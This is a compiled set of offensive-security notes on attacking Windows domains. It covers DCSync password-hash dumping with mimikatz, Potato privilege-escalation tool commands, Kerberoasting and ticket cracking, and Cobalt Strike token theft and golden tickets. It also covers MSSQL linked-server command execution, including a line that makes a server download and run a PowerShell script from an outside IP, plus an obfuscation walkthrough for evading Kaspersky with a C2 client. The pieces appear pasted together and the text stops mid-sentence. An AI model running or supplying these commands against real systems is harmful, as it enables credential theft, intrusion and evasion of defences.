via GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol)
I have previously done some packet captures for Domain Controller replication and identified
the intra-DC communication flow regarding how Domain Controllers replicate.
The Samba Wiki describes the DSGetNCChanges function:
“The client DC sends a DSGetNCChanges request to the server when the first one wants to get
AD objects updates from the second one. The response contains a set of updates that the client
has to apply to its NC replica.
It is possible that the set of updates is too large for only one response message. In those cases,
multiple DSGetNCChanges requests and responses are done. This process is called replication
cycle or simply cycle.”
“When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored
in RepsFrom data structure) it performs a replication cycle where it behaves like a client and
makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the
DC’s which it replicates from.”
From MSDN:
The IDL_DRSGetNCChanges method replicates updates from an NC replica on the server.
 ULONG IDL_DRSGetNCChanges(
   [in, ref] DRS_HANDLE hDrs,
   [in] DWORD dwInVersion,
   [in, ref, switch_is(dwInVersion)]
     DRS_MSG_GETCHGREQ* pmsgIn,
   [out, ref] DWORD* pdwOutVersion,
   [out, ref, switch_is(*pdwOutVersion)]
     DRS_MSG_GETCHGREPLY* pmsgOut
 );
hDrs: The RPC context handle returned by the IDL_DRSBind method.
dwInVersion: Version of the request message.
pmsgIn: A pointer to the request message.
pdwOutVersion: A pointer to the version of the response message.
pmsgOut: A pointer to the response message.
Return Values: 0 if successful, otherwise a Windows error code.
Exceptions Thrown: This method might throw the following exceptions beyond those thrown by
the underlying RPC protocol (as specified in [MS-RPCE]): ERROR_INVALID_HANDLE,
ERROR_DS_DRS_EXTENSIONS_CHANGED, ERROR_DS_DIFFERENT_REPL_EPOCHS,
and  ERROR_INVALID_PARAMETER.

Delegating Rights to Pull Account data:
It is possible to use a regular domain user account to run DCSync. The combination of the
following three rights need to be delegated at the domain level in order for the user account
to successfully retrieve the password data with DCSync:
•
Replicating Directory Changes (DS-Replication-Get-Changes)
Extended right needed to replicate only those changes from a given NC that are also
replicated to the Global Catalog (which excludes secret domain data). This constraint is
only meaningful for Domain NCs.
•
Replicating Directory Changes All (DS-Replication-Get-Changes-All)
Control access right that allows the replication of all data in a given replication NC,
including secret domain data.
•
Replicating Directory Changes In Filtered Set (rare, only required in some environments)

Note that members of the Administrators and Domain Controller groups have these rights by
default.

Pulling Password Data Using DCSync
Once the account is delegated the ability to replicate objects, the account can run Mimikatz
DCSync:
mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt”

Targeting an admin account with DCSync can also provide the account’s password history (in
hash format). Since there are LMHashes listed it may be possible to crack these and gain
insight into the password strategy the admin uses. This may provide the attacker to guess the
next password the admin uses if access is lost.
mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator”

 https://adsecurity.org/?p=1729
https://blog.netwrix.com/2022/09/30/extracting-user-password-data-with-mimikatz-dcsync/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-
abuse/dump-password-hashes-from-domain-controller-with-dcsync
Family Potato
How does this works?

Therefore, the vulnerability uses the following:
•
1. Local NBNS Spoofer: To impersonate the name resolution and force the system to
download a malicious WAPD configuration.
•
2. Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the
system to perform a NTLM authentication
•
3. HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to
create an elevated process.
To understand deeper this technique, the researchers post/video are recommended:
•
https://foxglovesecurity.com/2016/01/16/hot-potato/
•
https://www.youtube.com/watch?v=8Wjs__mWOKI
Exploitation
Download the binary from the repository: Here
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Is this vulnerability exploitable right now?
Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a
challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one
host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use
NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-
2016-3236). WAPD MITM Attack is patched.
Time to Rotten Potato.

Rotten Potato
Rotten Potato is quite complex, but mainly it uses 3 things:
•
1. RPC that is running through NT AUTHORITY/SYSTEM that is going to try to
authenticate to our local proxy through the CoGetInstanceFromIStorage API Call.
•
2. RPC in port 135 that is going to be used to reply all the request that the first RPC is
performing. It is going to act as a template.
•
3. AcceptSecurityContext API call to locally impersonate NT AUTHORITY/SYSTEM

•
1. Trick RPC to authenticate to the proxy with the CoGetInstanceFromIStorage API call.
In this call the proxy IP/Por t is specified.
•
2. RPC send a NTLM Negotiate package to the proxy.
•
3. The proxy relies the NTLM Negotiate to RPC in port 135, to be used as a template.
At the same time, a call to AcceptSecurityContext is performed to force a local
authentication. Notice that this package is modified to force the local authentication.
•
4. & 5. RPC 135 and AcceptSecurityContext replies with a NTLM Challenge . The
content of both packets are mixed to match a local negotiation and is forwarded to
the RPC, step 6..
•
7. RPC responds with a NLTM Auth package that is send to AcceptSecurityContext (8.)
and the impersonation is performed (9.).
To understand deeper this technique, the researchers post/video are recommended:
•
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-
service-accounts-to-system/
•
https://www.youtube.com/watch?v=8Wjs__mWOKI
Exploitation
Download the binary from the repository: Here
After having a meterpreter shell with incognito mode loaded:
MSFRottenPotato.exe t c:\windows\temp\test.bat
Is this vulnerability exploitable right now?
Decoder analyzed if this technique could be exploited in the latest Windows version, in this
blog post: https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
To sum up:
•
DCOM does not talk to our local listeners, so no MITM and no exploit.
•
Sending the packets to a host under our control listening on port 135, and then
forward the data to our local COM listener does not work. The problem is that in this
case, the client will not negotiate a Local Authentication.
Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server
2019

Lonely Potato
Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the
“incognito” module made by Decoder.
https://decoder.cloud/2017/12/23/the-lonely-potato/
Is this vulnerability exploitable right now?
Lonely Potato is deprecated and after visiting the repository, there is an indication to move
to Juicy Potato.

Juicy Potato
Juicy Potato is Rotten Potato on steroids. It allows a more flexible way to exploit the
vulnerability. In this case, ohpe & decoder during a Windows build review found a setup
where BITS was intentionally disabled and port 6666 was taken, therefore Rotten Potato PoC
won’t work.
What are BITS and CLSID?
•
CLSID is a globally unique identifier that identifies a COM class object. It is
an identifier like UUID.
•
Background Intelligent Transfer Service (BITS) is used by programmers and system
administrators to download files from or upload files to HTTP web servers and SMB file
shares. The point is that BITs implements the IMarshal interface and allows the proxy
declaration to force the NTLM Authentication.
Rotten Potato’s PoC used BITS with a default CLSID
// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
They discovered that other than BITS there are several out of process COM servers identified
by specific CLSIDs that could be abused. They need al least to:
•
Be instantiable by the current user, normally a service user which has impersonation
privileges
•
Implement the IMarshal interface
•
Run as an elevated user (SYSTEM, Administrator, …)
And they found a lot of them: http://ohpe.it/juicy-potato/CLSID/
What are the advantages?
•
We do not need to have a meterpreter shell
•
We can specify our COM server listen port
•
We can specify with CLSID to abuse
Exploitation
Download the binary from the repository: Here
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-
800EFCF26B83}
Does this still works?
Same case as Rotten potato.

Rogue Potato
After reading fixes regarding Rotten/Juicy potato, the following conclusions can be drawn:
•
You cannot specify a custom port for OXID resolver address in latest Windows versions
•
If you redirect the OXID resolution requests to a remote server on port 135 under your
control and the forward the request to your local Fake RPC server, you will obtain only
an ANONYMOUS LOGON.
•
If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an
identification token during the IRemUnkown2 interface query.
How does this works?

•
Rogue Potato instruct the DCOM server to perform a remote OXID query by specifying
a remote IP (Attacker IP)
•
On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests
to a fake OXID RPC Server
•
The fake OXID RPC server implements the ResolveOxid2 server procedure, which will
point to a controlled Named
Pipe [ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]].
•
The DCOM server will connect to the RPC server in order to perform
the IRemUnkown2 interface call. By connecting to the Named Pipe, an “Autentication
Callback” will be performed and we could impersonate the caller via
RpcImpersonateClient() call.
•
Then, a token stealer will:
o
Get the PID of the rpcss service
o
Open the process, list all handles and for each handle try to duplicate it and
get the handle type
o
If handle type is “Token” and token owner is SYSTEM, try to impersonate and
launch a process with CreatProcessAsUser() or CreateProcessWithToken()
To dig deeper read the author’s blog post: https://decoder.cloud/2020/05/11/no-more-
juicypotato-old-story-welcome-roguepotato/
What do you need to make it work?
•
You need to have a machine under your control where you can perform the redirect
and this machine must be accessible on port 135 by the victim
•
Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID
Resolver in standalone mode on a Windows machine under our control when the
victim’s firewall won’t accept incoming connections.
More info: https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html
Exploitation
Download the binary from the repository: Here
Run in your machine the socat redirection (replace VICTIM_IP):
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
Execute PoC (replace YOUR_IP and command):
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999

Sweet Potato
Sweet Potato is a collection of various native Windows privilege escalation techniques from
service accounts to SYSTEM. It has been created by @EthicalChaos and includes:
•
RottenPotato
•
Weaponized JuciyPotato with BITS WinRM discovery
•
PrintSpoofer discovery and original exploit
•
EfsRpc built on EfsPotato
•
PetitPotam
It is the definitelly potatoe, a potatoe to rule them all.
Exploitation
Download the binary from the repository: Here
./SweetPotato.exe

  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help

Generic Potato
Wait, another potato? Yes. Generic Potato is a modified version of SweetPotato
by @micahvandeusen to support impersonating authentication over HTTP and/or named
pipes.
This allows for local privilege escalation from SSRF and/or file writes. It is handy when:
•
The user we have access to has SeImpersonatePrivilege
•
The system doesn’t have the print service running which prevents SweetPotato.
•
WinRM is running preventing RogueWinRM
•
You don’t have outbound RPC allowed to any machine you control and the BITS service
is disabled preventing RoguePotato.
How do we abuse this? All we need is to cause an application or user with higher privileges to
authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token
and run a command for us as the user running the web server, probably system. More
information ca be found here
Exploitation
Download the binary from the repository: Here
.\GenericPotato.exe

  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
  -l, --port=VALUE           HTTP port to listen on (default 8888)
  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
  -h, --help                 Display this help
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://github.com/uknowsec/SweetPotato
https://github.com/CCob/SweetPotato
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-
escalation/juicypotato
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-
abuse/seimpersonateprivilege/potatoes
Kerberoast Attack
Here are the most popular AD Kerberos attacks:
1. SPN Scanning — finding services by requesting service principal names of a specific
SPN class/type.
2. Silver Ticket — forged Kerberos TGS service ticket
3. Golden Ticket — forged Kerberos TGT authentication ticket
4. MS14–068 Forged PAC Exploit — exploitation of the Kerberos vulnerability on Domain
Controllers.
Now, let’s see how we can leverage the Kerberos implementation to our advantage.
Old Technique
We will see and understand the old technique first (i.e. SPN Scanning and then cracking the
tickets).
In general, we follow the process below:
•
Enumerate the domain accounts with SPNs set- either with GetUserSPNS.ps1 script
from PowerView’s or Impacket’s “GetUserSPN.py“.
•
Request TGSs for these specific SPNs with the built-in Windows tool setspn.exe.
•
Extract these tickets from memory by invoking the kerberos::list /export Mimikatz
command, with the optional base64 export format set first. The tickets were then
downloaded, or the base64-encoded versions pulled down to the attacker’s machine
and decoded. (Note: You don’t need admin rights to execute the command :))
•
Begin offline password cracking with “tgsrepcrack.py”, or John whit the help for
kirbi2john.py.
Let’s see the Demo :)
We can scan the services with windows built-in utility. I have used in-built utility (i.e
setspn.exe).

“setspn.exe” output
Now, if you notice we have “CN= Computers” and “CN=Users” for listed service accounts. We
will be focusing on “CN=Users” as these are user generated and so we can try to crack :).

Now that we know the service accounts which we will be cracking or trying to crack, let’s go
ahead and request Kerberos tickets for specific service accounts.
Command: Add-Type -AssemblyName System.IdentityModel New-
ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList “SPN
Name”

Powershell Command (Non Admin User)
Now, we have tickets in memory. We will use Mimikatz to export the tickets from memory.
This is one of the down side of this method as you are running Mimikatz this might trigger
Alert or this can be detected by AV’s.
Note: You can also load Mimikatz into memory using PowerShell “IEX (New-Object
Net.WebClient).DownloadString” feature)
Command: Invoke-Pwc -Command ‘“kerberos::list /export” exit”’
Export Ticket from Memory

Extracted Tickets
We have successfully extracted the tickets from memory. Can we crack these tickets?? There
are multiple ways to try this. Let’s see how we can leverage tgsrepcrack.py form Kerberoast
toolkit.
1 > Using Kerberosast: Tgsrepcrack.py
We have provided the wordlist to crack the kirbi file
Command: C:\Users\pratik\Desktop\kerberoast>python tgsrepcrack.py dict.txt “Ticket.kirbi”

Cracked Ticket
:) Cracked
2> Convert .kirbi file to John the Ripper format
Now, we will use John the Ripper to crack the tickets. We know that tickets are in kirbi format
so first we will convert the ticket to John the Ripper format. We can use Kerberoast
(kirbi2john.py) for the same.

John the Ripper format
Command:./john –format=krb5tgs crack_file — wordlist=dict.txt

Cracked using John the Ripper
Cracked :)
New Technique
HarmJ0y has written a good blog on kerberoasting without Mimikatz. This technique is pretty
straight forward and simpler than the old technique :)
What you need is “Invoke-Kerberoast.ps1” and then you are good to go :) To crack the tickets,
first import “.ps1” module.
This will request the associated TGS Tickets in john or hashcat crackable format :)

Invoke-Kerberoast
Crack the tickets using John the Ripper

Cracked using John the Ripper
https://www.cobalt.io/blog/kerberoast-attack-techniques
https://www.cobaltstrike.com/blog/pass-the-golden-ticket/
Trust Relationship
Trust Relationships
The heart of Windows single sign-on is the access token. When a user logs onto a Windows
host, an access token is generated. This token contains information about the user and their
rights. The access token also holds information needed to authenticate the current user to
another system on the network. Impersonate or generate a token and Windows will use its
information to authenticate to a network resource for you.
Use steal_token [pid] or steal_token [pid] <OpenProcessToken access mask> to steal an
access token from an existing process.
If you’d like to see which processes are running use ps. The getuid command will print your
current token. Use rev2self to revert back to your original token.
OpenProcessToken access mask suggested values:
blank = default (TOKEN_ALL_ACCESS)
0 = TOKEN_ALL_ACCESS
11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8)
Access mask values:
STANDARD_RIGHTS_REQUIRED . . . . : 983040
TOKEN_ASSIGN_PRIMARY . . . . . . : 1
TOKEN_DUPLICATE  . . . . . . . . : 2
TOKEN_IMPERSONATE  . . . . . . . : 4
TOKEN_QUERY  . . . . . . . . . . : 8
TOKEN_QUERY_SOURCE . . . . . . . : 16
TOKEN_ADJUST_PRIVILEGES  . . . . : 32
TOKEN_ADJUST_GROUPS  . . . . . . : 64
TOKEN_ADJUST_DEFAULT . . . . . . : 128
TOKEN_ADJUST_SESSIONID . . . . . : 256

NOTE:
'OpenProcessToken access mask' can be helpful for stealing tokens from processes using
'SYSTEM' user and you have this error: Could not open process token: {pid} (5)
You can set your preferred default with '.steal_token_access_mask' in the Malleable C2 global
options.
If you know credentials for a user; use make_token [DOMAIN\user] [password] to generate a
token that passes these credentials. This token is a copy of your current token with modified
single sign-on information. It will show your current username. This is expected behavior.
The Beacon command pth [pid] [arch] [DOMAIN\user] [ntlm hash] injects into the specified
process to generate AND impersonate a token. Use pth [DOMAIN\user] [ntlm hash] (without
[pid] and [arch] arguments) to spawn a temporary process to generate AND impersonate a
token. This command uses mimikatz to generate AND impersonate a token that uses the
specified DOMAIN, user, and NTLM hash as single sign-on credentials. Beacon will pass this
hash when you interact with network resources.
Beacon’s Make Token dialog ([beacon] -> Access -> Make Token) is a front-end for these
commands. It will present the contents of the credential model and it will use the right
command to turn the selected credential entry into an access token.
Kerberos Tickets
A Golden Ticket is a self-generated Kerberos ticket. It's most common to forge a Golden Ticket
with Domain Administrator rights
Go to [beacon] -> Access -> Golden Ticket to forge a Golden Ticket from Cobalt Strike. Provide
the following pieces of information and Cobalt Strike will use mimikatz to generate a ticket and
inject it into your kerberos tray:
1. The user you want to forge a ticket.
2. The domain you want to forge a ticket for.
3. The domain's SID
4. The NTLM hash of the krbtgt user on a domain controller.
Use kerberos_ticket_use [/path/to/ticket] to inject a Kerberos ticket into the current session.
This will allow Beacon to interact with remote systems using the rights in this ticket.
Use kerberos_ticket_purge to clear any Kerberos tickets associated with your session.
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/
post-exploitation_trust-relationships.htm?cshid=1094
MSSQL Abuse
MSSQL Enumeration / Discovery
The powershell module PowerUpSQL is very useful in this case.
Import-Module .\PowerupSQL.psd1
Enumerating from the network without domain session
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo
#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10
#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to
login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -
Username test -Password test
Enumerating from inside the domain
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo
#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-
SQLServerInfo
MSSQL Basic Abuse
Access DB
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-
SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance,
database, column, sample | ft -autosize
MSSQL RCE
It might be also possible to execute commands inside the MSSQL host
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
Check in the page mentioned in the following section how to do this manually.
MSSQL Basic Hacking Tricks

1433 - Pentesting MSSQL - Microsoft SQL Server

MSSQL Trusted Links
If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has
privileges over the trusted database, he is going to be able to use the trust relationship to
execute queries also in the other instance. This trusts can be chained and at some point the
user might be able to find some misconfigured database where he can execute commands.
The links between databases work even across forest trusts.
Powershell Abuse
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is
also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose
#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure
''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'
#Execute a query in all linked instances (try to execute commands), output should be in
CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell
'whoami'"
#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell
iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from
openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM
OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name =
''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced
options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1;
reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM
OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell
whoami'''''');'
Metasploit
You can easily check for trusted links using metasploit.
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a
meterpreter session
Notice that metasploit will try to abuse only the openquery() function in MSSQL (so, if you
can't execute command with openquery() you will need to try the EXECUTE method manually
to execute commands, see more below.)
Manual - Openquery()
From Linux you could obtain a MSSQL console shell with sqsh and mssqlclient.py.
From Windows you could also find the links and execute commands manually using a MSSQL
client like HeidiSQL
Login using Windows authentication:

Find Trustable Links
select * from master..sysservers

Execute queries in trustable link
Execute queries through the link (example: find more links in the new accessible instance):
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
Check where double and single quotes are used, it's important to use them that way.

You can continue these trusted links chain forever manually.
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell
''powershell -w hidden -enc blah''')
# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>",
''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
If you cannot perform actions like exec xp_cmdshell from openquery() try with the EXECUTE
method.
Manual - EXECUTE
You can also abuse trusted links using EXECUTE:
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT
"DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT
"DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
Local Privilege Escalation
The MSSQL local user usually has a special type of privilege called SeImpersonatePrivilege.
This allows the account to "impersonate a client after authentication".
A strategy that many authors have come up with is to force a SYSTEM service to authenticate
to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then
able to impersonate the SYSTEM service whilst it's trying to authenticate.
SweetPotato has a collection of these various techniques which can be executed via Beacon's
execute-assembly command.
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-
mssql
https://www.netspi.com/blog/technical/network-penetration-testing/powerupsql-powershell-
toolkit-attacking-sql-server/
https://www.sqlshack.com/working-with-powershells-invoke-sqlcmd/
https://www.red-gate.com/simple-talk/sysadmin/powershell/introduction-to-powershell-
with-sql-server-using-invoke-sqlcmd/
https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_moveme
nt/Invoke-SQLOSCmd.ps1
Powershell Tips and Tricks
I recently received a question from someone wanting to know how I encoded a string of text
on my blog site. Back in January of 2013, I competed in Jeff Hicks PowerShell Challenge that
was held by TrainSignal. One of the questions had an encoded command which you were to
decode. I figured out that the EncodedCommand parameter of PowerShell.exe could not only
be used to run commands that are encoded with Base64, that it could also be used to easily
decode a string of text that was encoded with Base64.
https://devblogs.microsoft.com/scripting/powertip-encode-string-and-execute-with-
powershell/
https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-
encoding/
https://linuxhint.com/base64-encoding-decoding-powershell/
https://shellgeek.com/powershell-base64-encoding/
https://raikia.com/tool-powershell-encoder/
https://github.com/gh0x0st/Invoke-PSObfuscation
Invoke-Obfuscation is a tool developed to aid Blue Teams to simulate obfuscated payloads and
to enhance their detection capabilities. This tool helps security teams to adapt the techniques
used by adversaries and to find malicious indicators.
In this article we will be covering how to use Invoke-Obfuscation and will be exploring some of
its features.
The tool can be downloaded from the Github repository. Before we start exploring the tool,
first we will write the command which we will be using in the demo. The following command
downloads the payload from a website and using Invoke-Expression cmdlet of Powershell, we
will execute it. The payload simply outputs Hello World in black background. Using this
technique, any malicious payload can be downloaded and executed using Powershell.
https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-
87de291d61d3
https://www.youtube.com/watch?v=6o7hMytqBfA
https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i
https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-
series-chapter-1-intro/
https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/
https://attack.mitre.org/techniques/T1027/
Let’s download Trevorc2 and Pyfuscation
Git clone https://github.com/trustedsec/trevorc2
Git clone https://github.com/CBHue/PyFuscation
After downloading Trevorc2 and Pyfuscation using the git clone, copy the file trevor_client.ps1,
and throw it into the Pyfuscation folder

Change the IP address of SITE_URL to the IP of your Kali machine and save

Let’s obfuscate our powershell with pyfuscation

If all goes well it will generate this output, where the folder with obfuscated code is located

After that just access the folder and rename the file.ps1

We are going to open an HTTP server with python using http.server and now we are going to
download ps1 on the victim’s machine

Realize that Kaspersky is operating and active

Now I will open Powershell in Admin

Now I’m going to access Firefox, type your Kali’s IP address on port 8000 to download the
malicious powershell

Notice that it is in the downloads folder

Now let’s run the trevorc2 server: python3 trevorc2_server.py

let’s run the malicious powershell

This error means that our powershell has a policy of not executing any type of script
Let’s type the following command to release Set-ExecutionPolicy Unrestricted

Now let’s run the script, it says it is not a reliable script

See that the agent has now communicated with our C2, so Kaspersky did not detect the threat

View machine information

Note that we bypass Kaspersky Endpoint Security for Windows with ease

This is the result of Hybrid-Analysis and Virus Total, no detection.
Of course I uploaded it on purpose on the virus total.

https://github.com/CBHue/PyFuscation
Additionals Resource
Unmanaged Powershell
How do you get your PowerShell scripts on target, run them, and get output back? This is
the PowerShell weaponization problem. It’s unintuitively painful to solve in an OPSEC-friendly
way (unless your whole platform is PowerShell).
Cobalt Strike tackled this problem in its September 2014 release. Beacon’s PowerShell
weaponization allows operators to import scripts, run cmdlets from these scripts, and interact
with other PowerShell functionality. Beacon’s method is lightweight. It doesn’t touch disk or
require an external network connection. It has a downside though: it relies on powershell.exe.
In December 2014, Lee Christensen came out with an Unmanaged PowerShell proof-of-
concept [blog post]. Unmanaged PowerShell is a way to run PowerShell scripts without
powershell.exe. Lee’s code loads the .NET CLR, reflectively loads a .NET class through that CLR,
and uses that .NET class to call APIs in the System.management.automation namespace to
evaluate arbitrary PowerShell expressions. It’s a pretty neat piece of code.
This release integrates Lee’s work with Beacon. The powerpick [cmdlet+args] command
(named after Justin Warner’s early adaptation of Lee’s POC) will spawn a process, inject the
Unmanaged PowerShell magic into it, and run the requested command.
I’ve also added psinject [pid] [arch] [command] to Beacon as well. This command will inject
the Unmanaged PowerShell DLL into a specific process and run the command you request. This
is ideal for long-running jobs or injecting PowerShell-based agents (e.g., Empire) into a specific
process.
I took a lot of care to make powerpick and psinject behave the same way as Beacon’s existing
powershell command (where possible). All three commands are friendly to long-running jobs
and they will return output as it’s available. All three commands can also use functions from
scripts brought into Beacon with the powershell-import command.
https://www.cobaltstrike.com/blog/cobalt-strike-3-3-now-with-less-powershell-exe/
Cobalt Strike Tradecraft
Shell
When an operator uses the shell command in Cobalt Strike, it’s usually to execute a DOS
command directly, such as dir, copy, move, etc. Under the hood, the shell command
calls cmd.exe /c.

With Sysmon logging, this leaves a sequence of events, all around Event Code 1, Process
Create.

We can see here that the shell command spawns cmd.exe under the parent
process. whoami though, is also actually an executable within System32, so cmd.exe also
spawns that as a child process. But, before that occurs, conhost.exe is called in tandem with
cmd.exe. Conhost.exe is a process that’s required for cmd.exe to interface with Explorer.exe.
What is unique, is how Conhost.exe is created:

In this case, Conhost.exe’s arguments are 0xffffffff -ForceV1, which tells Conhost which
application ID it should connect to. Per Microsoft:
“The session identifier of the session that is attached to the physical console. If there is no
session attached to the physical console, (for example, if the physical console session is in the
process of being attached or detached), this function returns 0xFFFFFFFF.”

A goal of op-sec is to always minimize the amount of traffic, or “footprints” that your activities
leave behind. As you can see, shell generates quite a few artifacts and it’s common for
detections to pick up as cmd.exe /c is seldom used in environments.
PTH
The PTH, or pass-the-hash, command has even more indicators than shell.

From Cobalt Strike’s blog https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-
and-alternate-credentials/:
“The pth command asks mimikatz to: (1) create a new Logon Session, (2) update the credential
material in that Logon Session with the domain, username, and password hash you provided,
and (3) copy your Access Token and make the copy refer to the new Logon Session. Beacon
then impersonates the token made by these steps and you’re ready to pass-the-hash.”
This creates several events.
First, the ‘spawnto’ process that is dictated in the Cobalt Strike profile is created, which in my
